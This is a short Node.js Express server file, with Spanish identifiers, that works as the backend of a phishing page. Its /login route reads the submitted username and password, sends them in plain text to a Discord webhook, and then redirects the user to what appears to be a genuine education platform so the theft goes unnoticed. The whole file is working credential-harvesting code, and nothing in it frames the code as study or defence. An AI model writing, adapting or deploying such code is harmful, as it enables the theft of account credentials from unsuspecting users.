import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import fetch from 'node-fetch'; // si usas fetch en Node.js

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/login', async (req, res) => {
  const { usuario, contraseña } = req.body;

  const webhookURL = 'https://discord.com/api/webhooks/...';

  await fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: `Usuario: ${usuario}, Contraseña: ${contraseña}` })
  });

  res.redirect('https://app.thepower.education/');
});

app.listen(PORT, () => {
  console.log(`Servidor en http://localhost:${PORT}`);
});
